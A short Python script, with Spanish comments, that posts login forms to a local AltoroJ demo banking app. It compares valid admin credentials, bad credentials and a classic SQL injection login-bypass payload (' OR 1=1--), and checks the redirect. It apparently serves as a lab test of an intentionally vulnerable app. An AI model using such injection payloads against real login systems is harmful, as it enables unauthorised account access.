
import requests

import sys

# URL del login

url = "http://localhost:8080/AltoroJ/doLogin"

# Datos del login en el formato adecuado

paramsattack = {

    "uid": "' OR 1=1--", 

    "passw": "hola", 

    "btnSubmit": "Login"

}



paramsOk= {

	"uid": "admin",

	"passw": "admin",

	"btnSubmit": "Login"

}



paramsMalo={

	"uid": "adm",

	"passw": "hola",

	"btnSubmit": "Login"

}



def Login(params):

    try:

        response = requests.post(url, data=params, allow_redirects=False)  
        if response.status_code == 302:

            location = response.headers.get('Location')
            if location == "/AltoroJ/bank/main.jsp":
                print(f"1, Redirigido a: {location}")
                sys.exit(1)
            else:
                print(f" 0, {location}")
                sys.exit(0)
        else:
            print(f"Respuesta recibida con código: {response.status_code}")
    except requests.exceptions.RequestException as e:

        print(f"Error en la conexión: {e}")

Login(paramsMalo)

